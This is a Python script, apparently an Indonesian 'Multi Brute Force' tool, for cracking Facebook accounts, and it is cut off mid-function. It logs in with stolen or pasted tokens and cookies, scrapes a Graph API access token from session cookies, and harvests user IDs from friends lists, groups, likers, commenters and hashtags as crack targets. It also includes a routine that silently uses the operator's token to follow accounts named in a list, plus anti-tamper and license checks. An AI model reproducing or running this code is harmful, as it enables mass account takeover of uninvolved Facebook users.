#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Dapunta And XNSCODE Project
# Update V1.6
_auth01_ = 'Dapunta AR'

# Author : Dapunta Adyapaksi R.
# Facebook (Dapunta Khurayra X)   : Facebook.com/Dapunta.Khurayra.X
# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : Instagram.com/ratya.anonym.id
# Whatsapp (Dapunta Bot_Key)      : +6282245780524
# YouTube (Xayonara.ID)           : Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA

# Recode SC Orang Itu Gak Keren Bro
# Lu Gaakan Bisa Berkembang Kalau Skillu Cuma Recode
# Gaada Yg Susah Selama Lu Mau Belajar & Berusaha
# Jangan Sampai Lu Jual File Source Code Ini !

### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote

### Lol You Noobers
bomb1 = 'bomb1.txt'
bomb2 = 'bomb2.txt'
bomb3 = 'bomb3.txt'
bomb4 = 'bomb4.txt'
pisah = '======='

### Perumpamaan Module & Syntax
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_dapunta_cici_    = print
_cici_dapunta_    = input
_dapunta_dapunta_ = open
_cici_cici_       = exit

### Gabisa Recode Lu Ya !!!
def aowkaowkaowk():
    _hayo_mau_recode_ = open('anti_recode.txt','r').read()
    if len(_hayo_mau_recode_) == 24:hihi = open('recode_anti.txt','w');hihi.write(_auth01_);hihi.close();_mampus_gabisa_recode_ = open('recode_anti.txt','r').read();aowkaowkaowkaowk(_mampus_gabisa_recode_)
    else:kata_buat_perecode()

### Warna
Z = "\x1b[0;90m" # Hitam
P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati

### Host & Penampungan
url_license = 'https://server.dapunta.my.id/chek.php?project=licenseelitedapunta&apikey='
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
count = 1
data_1 = {}
data_2 = {}
data_change_1 = {}
data_change_2 = {}
data_user = []
header_grup = {"user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}

### Waktu & Tanggal
__sekarang__ = datetime.now()
__tahun__ = __sekarang__.year
__bulan__ = __sekarang__.month
__hari__  = __sekarang__.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
_list_bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
_qwerty_ = 'https://github.com/Dapunta/elite/blob/main/hahaha.txt'
try:
    if __bulan__ < 0 or __bulan__ > 12:
        _cici_cici_()
    _bulan_sekarang_ = __bulan__ - 1
except ValueError:
    _cici_cici_()
_bulan_ = _list_bulan_[_bulan_sekarang_]
tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))

### Akun Author Jangan Diganti Nanti Error !!!
_my_account_ = [""]

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

### Clear Login Session
def bersih():
    try:os.remove('token.txt')
    except:pass
    try:os.remove('cookies.txt')
    except:pass

### Display Text
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

### Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

### Logo
def banner(cok):
    anti_ganti()
    if len(cok) != 10:kata_buat_perecode()
    else:
        _logo_line_1_ = ('%s   _______ __         ___'%(O))
        _logo_line_2_ = ('%s  / __/ (_) /____ %s©  %s<  /  ╔═══════════════════════╗'%(O,P,O))
        _logo_line_3_ = ('%s / _// / / __/ -_)   / /   ║  %sCoded By %s  %s║'%(O,P,open('recode_anti.txt','r').read(),O))
        _logo_line_4_ = ('%s/___/_/_/\__/\__/  _/ /_   ║    %s• XNSCODETEAM •    %s║'%(O,P,O))
        _logo_line_5_ = ('%sMulti Brute Force %s/____/   ╚═══════════════════════╝'%(P,O))
        _dapunta_cici_(_logo_line_1_)
        _dapunta_cici_(_logo_line_2_)
        _dapunta_cici_(_logo_line_3_)
        _dapunta_cici_(_logo_line_4_)
        _dapunta_cici_(_logo_line_5_+'\n')
        _haha_hihi_(_logo_line_3_)
        _bacot_ = {'logo1':_logo_line_1_,'logo2':_logo_line_2_,'logo3':_logo_line_3_,'logo4':_logo_line_4_,'logo5':_logo_line_5_}
        return(_bacot_)

### Cek Cookies
def cek_dev():
    _isi_dev_ = _dapunta_dapunta_('cookies.txt','r').read()
    if 'null' in _isi_dev_:jalan('%s╚══[%s!%s] %sCookies Invalid, Login Ulang Dengan Cookies'%(M,P,M,P));bersih();_cici_cici_()
    else:pass

### Bot Follow Jangan Diganti Anjink !
def bot_follow(_tok_dev_):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
            except:pass
        _dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P));time.sleep(2)
    except:pass
    
### Menu Login
def menu_log():
    bersih();clear()
    try:_haha_hihi_(banner(_auth01_).get('logo3'))
    except:kata_buat_perecode()
    var_menu();_bomb_1_ = open(bomb1,'r').read();_bomb_2_ = open(bomb2,'r').read();_bomb_3_ = open(bomb3,'r').read();_bomb_4_ = open(bomb4,'r').read()
    pmu = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if _bomb_1_ == '_zxcv!.95lltgv#@%-=;sfg_':
        if _bomb_2_ == 'Dapunta_Ratya':
            if _bomb_3_ == 'EliteSourceCode01':
                if _bomb_4_ == 'ILoveYou':pass
                else:kata_buat_perecode()
            else:kata_buat_perecode()
        else:kata_buat_perecode()
    else:kata_buat_perecode()
    if pmu in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = _cici_dapunta_('%s╚══[%s•%s] %sToken : '%(O,P,O,P))
        try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _dapunta_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _dapunta_dapunta_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
        except (KeyError,IOError):_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P));bersih();menu_log()
        except requests.exceptions.ConnectionError:_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = _cici_dapunta_('%s╚══[%s•%s] %sCookies : '%(O,P,O,P))
        try:header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie};r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\w+)', r.text);token=p.group(1);xd = _dapunta_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _dapunta_dapunta_('cookies.txt','w');xz.write(cookie);xz.close();bot_follow(token);menu()
        except requests.exceptions.ConnectionError:_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
        except (KeyError,IOError,AttributeError):_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,P,M,P));bersih();menu_log()
    elif pmu in ['3','03','003','c']:
        clear()
        try:_haha_hihi_(banner(_auth01_).get('logo3'))
        except:kata_buat_perecode()
        var_tutor()
        pf = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P));_dapunta_cici_('%s║'%(O))
        if pf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
        elif pf in ['1','01','001','a']:os.system('xdg-_dapunta_dapunta_ https://youtu.be/iUfEGHXdQQM');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
        elif pf in ['2','02','002','b']:os.system('xdg-_dapunta_dapunta_ https://youtu.be/iUfEGHXdQQM');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
        elif pf in ['3','03','003','c']:os.system('xdg-_dapunta_dapunta_ https://youtu.be/9snR31AI_h8');tutor_target();_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
        elif pf in ['4','04','004','d']:tutor_crack();_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        try:_haha_hihi_(banner(_auth01_).get('logo3'))
        except:kata_buat_perecode()
        var_author();_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu_log()
    elif pmu in ['5','05','005','e']:buy_license()
    elif pmu in ['6','06','006','f']:hasil()
    elif pmu in ['7','07','007','g']:cek_hasil()
    elif pmu in ['0','00','000','z']:jalan('%s╠══[%s!%s] %sTerima Kasih Telah Menggunakan SC Ini'%(O,P,O,P));jalan('%s╚══[%s!%s] %sSemoga Harimu Menyenangkan :)\n'%(O,P,O,P));time.sleep(3);bersih();clear();_cici_cici_()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()

### Menu Utama
def menu():
    clear()
    try:_haha_hihi_(banner(_auth01_).get('logo3'))
    except:kata_buat_perecode()
    _bomb_1_ = open(bomb1,'r').read();_bomb_2_ = open(bomb2,'r').read();_bomb_3_ = open(bomb3,'r').read();_bomb_4_ = open(bomb4,'r').read()
    if _bomb_1_ == '_zxcv!.95lltgv#@%-=;sfg_':
        if _bomb_2_ == 'Dapunta_Ratya':
            if _bomb_3_ == 'EliteSourceCode01':
                if _bomb_4_ == 'ILoveYou':pass
                else:kata_buat_perecode()
            else:kata_buat_perecode()
        else:kata_buat_perecode()
    else:kata_buat_perecode()
    try:
        lisensi = _dapunta_dapunta_("license.txt","r").read();wl = _req_get_(url_license + lisensi);wk = _js_lo_(wl.text);kun = lisensi.split('-');users = wk['username'];mailerts = wk['email'].split('@');mailert1 = mailerts[0];mailert2 = mailerts[1];mailer = mailert1[:5];maile = (mailer+'xx@'+mailert2);bergabung = wk['joined'];kadaluarsa = wk['expired'];status = ('%sPremium [%sPro%s]'%(O,P,O));kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(O,kun[0],P,O,kun[1],P,O));pro = '';upgrade = 'Ganti License Key';jid = ''
        try:
            _dapunta_ = _dapunta_dapunta_("token.txt","r").read();_cici_ = _dapunta_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
            if 'null' in _cici_:status_cookies = ('%sTidak'%(M));W = H;Y = P
            else:status_cookies = ('%sYa'%(H));W = H; Y = P
        except (KeyError,IOError):_dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P));_dapunta_cici_('%s║'%(M));jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));bersih();menu_log()
    except (KeyError,IOError):
        status = 'Pengguna Gratis Tapi Vvip';users = '-';maile = '-';kunci = '-';bergabung = '-';kadaluarsa = '-';pro = ("%s[%sPro%s]"%(O,P,O));upgrade = ('Anda Sudah Versi %sPro'%(O));jid = ('%s[%sULTIMED !!!%s]'%(O,P,O));W = H;Y = P
        try:
            _dapunta_ = _dapunta_dapunta_("token.txt","r").read();_cici_ = _dapunta_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
            if 'null' in _cici_:status_cookies = ('%sTidak'%(M));W = H;Y = P
            else:status_cookies = ('%sYa'%(H));W = H; Y = P
        except (KeyError,IOError):_dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P));_dapunta_cici_('%s║'%(M));jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));bersih();menu_log()
    except ValueError:
        jalan('Server Sedang Maintenance');jalan('Coba Lagi Beberapa Saat');jalan('Fitur Premium Saat Ini');jalan('Belum Bisa Digunakan');time.sleep(5);clear()
        try:_haha_hihi_(banner(_auth01_).get('logo3'))
        except:kata_buat_perecode()
        status = 'Maintenance';users = '-';maile = '-';kunci = '-';bergabung = '-';kadaluarsa = '-';pro = ("%s[%sPro%s]"%(O,P,O));upgrade = ('Tingkatkan Ke Versi %sPro'%(O));jid = ('%s[%s999999 ID%s]'%(O,P,O))
    try:token = _dapunta_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];i = y['id']
    except (KeyError,IOError):_dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P));_dapunta_cici_('%s║'%(M));jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));bersih();menu_log()
    except requests.exceptions.ConnectionError:_dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P));_dapunta_cici_('%s║'%(M));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
    except requests.exceptions.ConnectionError:_dapunta_cici_('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P));_dapunta_cici_('%s║'%(M));jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"]
    except KeyError:ip = " "
    _update_ = 'V1.6'
    _dapunta_cici_('%s╔══[ %sSelamat Datang %s %s]'%(O,P,n,O))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))
    _dapunta_cici_('%s╠══[%s•%s] %sIP : %s'%(O,P,O,P,ip))
    _dapunta_cici_('%s╠══[%s•%s] %sToken/Cookies : %sYa%s/%s'%(O,P,O,P,H,P,status_cookies))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s•%s] %sStatus : %s'%(O,P,O,P,status))
    _dapunta_cici_('%s╠══[%s•%s] %sVersi : %s'%(O,P,O,P,_update_))
    _dapunta_cici_('%s╠══[%s•%s] %sNama : %s'%(O,P,O,Y,users))
    _dapunta_cici_('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,Y,maile))
    _dapunta_cici_('%s╠══[%s•%s] %sKey : %s'%(O,P,O,Y,kunci))
    _dapunta_cici_('%s╠══[%s•%s] %sPembelian : %s'%(O,P,O,Y,bergabung))
    _dapunta_cici_('%s╠══[%s•%s] %sKedaluwarsa : %s'%(O,P,O,Y,kadaluarsa))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s01%s] %sCrack ID Teman/Publik %s'%(O,P,O,P,jid))
    _dapunta_cici_('%s╠══[%s02%s] %sCrack ID Pengikut %s'%(O,P,O,W,jid))
    _dapunta_cici_('%s╠══[%s03%s] %sCrack ID Pencarian Nama'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s04%s] %sCrack ID Daftar Pesan'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s05%s] %sCrack ID Likers Post'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s06%s] %sCrack ID Komentar Post'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s07%s] %sCrack ID Anggota Grup'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s08%s] %sCrack ID Dari File'%(O,P,O,Y))
    _dapunta_cici_('%s╠══[%s09%s] %sCrack ID Dari Email'%(O,P,O,Y))
    _dapunta_cici_('%s╠══[%s10%s] %sCrack Username'%(O,P,O,Y))
    _dapunta_cici_('%s╠══[%s11%s] %sCrack ID Dari Hashtag'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s12%s] %sCrack ID Dari Beranda'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s13%s] %sCrack ID Pertemanan Masuk'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s14%s] %sCrack ID Pertemanan Keluar'%(O,P,O,W))
    _dapunta_cici_('%s╠══[%s15%s] %sMengambil Data Target'%(O,P,O,Y))
    _dapunta_cici_('%s╠══[%s16%s] %sMengambil Jumlah Teman'%(O,P,O,Y))
    _dapunta_cici_('%s╠══[%s17%s] %sCek Opsi Hasil Crack'%(O,P,O,Y))
    _dapunta_cici_('%s╠══[%s18%s] %sCek Hasil Crack'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s19%s] %sUser Agent'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s20%s] %s%s'%(O,P,O,P,upgrade))
    _dapunta_cici_('%s╠══[%s00%s] %sLog Out'%(O,P,O,P))
    pm = _cici_dapunta_('%s╠══[%s••%s] %sPilih : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pm in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pm in ['1','01','001','a']:publik(token)
    elif pm in ['2','02','002','b']:cek_dev();followers(_salsabila_)
    elif pm in ['3','03','003','c']:cek_dev();dump_name(_salsabila_)
    elif pm in ['4','04','004','d']:cek_dev();dump_pesan(_salsabila_,n,i)
    elif pm in ['5','05','005','e']:cek_dev();main_likers(_salsabila_)
    elif pm in ['6','06','006','f']:cek_dev();main_komen(_salsabila_)
    elif pm in ['7','07','007','g']:cek_dev();dump_grup(_salsabila_,_dapunta_)
    elif pm in ['8','08','008','h']:dump_file()
    elif pm in ['9','09','009','i']:dump_email()
    elif pm in ['10','010','0010','j']:dump_username()
    elif pm in ['11','011','0011','k']:cek_dev();hashtag(_salsabila_)
    elif pm in ['12','012','0012','l']:cek_dev();beranda(_salsabila_)
    elif pm in ['13','013','0013','m']:cek_dev();permintaan_pertemanan_masuk(_salsabila_)
    elif pm in ['14','014','0014','n']:cek_dev();permintaan_pertemanan_keluar(_salsabila_)
    elif pm in ['15','015','0015','o']:target()
    elif pm in ['16','016','0016','p']:teman_target()
    elif pm in ['17','017','0017','q']:cek_hasil()
    elif pm in ['18','018','0018','r']:hasil()
    elif pm in ['19','019','0019','s']:ugen()
    elif pm in ['20','020','0020','t']:buy_license()
    elif pm in ['0','00','000','z']:jalan('%s╚══[%s!%s] %sSampai Jumpa %s%s%s'%(O,P,O,P,O,n,P));bersih();menu_log()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()

### User Agent Bawaan
def defaultua():
    ua = ua_xiaomi
    try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
    except (KeyError,IOError):menu_log()

### Menu User Agent
def ugen():
    var_ugen()
    pmu = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pmu in[""]:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:os.system('xdg-_dapunta_dapunta_ https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt");ua = _cici_dapunta_("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(O,P,O,P))
        try:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
        except (KeyError,IOError):jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M));_dapunta_cici_('%s║'%(M));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
    elif pmu in ['5','05','005','e']:
        try:ungser = _dapunta_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):ungser = 'Tidak Ditemukan'
        _dapunta_cici_("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser));jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()
    elif pmu in ['0','00','000','f']:menu()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    _dapunta_cici_('%s╠══[%s1%s] %sXiaomi'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s2%s] %sNokia'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s3%s] %sAsus'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s4%s] %sHuawei'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s5%s] %sVivo'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s6%s] %sOppo'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s7%s] %sSamsung'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s8%s] %sWindows'%(O,P,O,P))
    pc = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    _dapunta_cici_('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pc in ['1','01']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));_dapunta_cici_('%s║'%(O));_cici_dapunta_('%s╚══[ %sKembali %s]%s'%(O,P,O,P));menu()

### Dump ID From Public
def publik(token):
    anti_ganti()
    try:lisensi = _dapunta_dapunta_("license.txt","r").read();wl = _req_get_(url_license + lisensi);wk = _js_lo_(wl.text);wj = wk['username'];jid = '5000'
    except (KeyError,IOError):jid = '999999'
    except requests.exceptions.ConnectionError:jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P));_cici_cici_()
    try:
        _dapunta_cici_('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P));it = _cici_dapunta_("%s╠══[%s•%s] %sID Target : "%(O,P,O,P));cek_target_crack_(it)
        try:pb = _req_get_("https://graph.facebook.com/" + it + "?fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + token);ob = _js_lo_(pb.text);_dapunta_cici_ ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):_dapunta_cici_('%s║'%(O));jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
        r = _req_get_("https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s"%(it,jid,token));id = [];z = _js_lo_(r.text);xc = (ob["first_name"]+".json").replace(" ","_");xb = _dapunta_dapunta_(xc,"w")
        for a in z["data"]:
            try:id.append(a["id"]+"•"+a["name"]);xb.write(a["id"]+"•"+a["name"]+"\n")
            except:continue
        xb.close();_dapunta_cici_('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)));return crack(xc)
    except (KeyError,IOError):_cici_cici_('%s╚══[%s!%s] %sToken/Cookies Invalid Atau ID Tidak Ditemukan'%(M,P,M,P))

### Dump ID From Followers
def followers(cookies):
    anti_ganti()
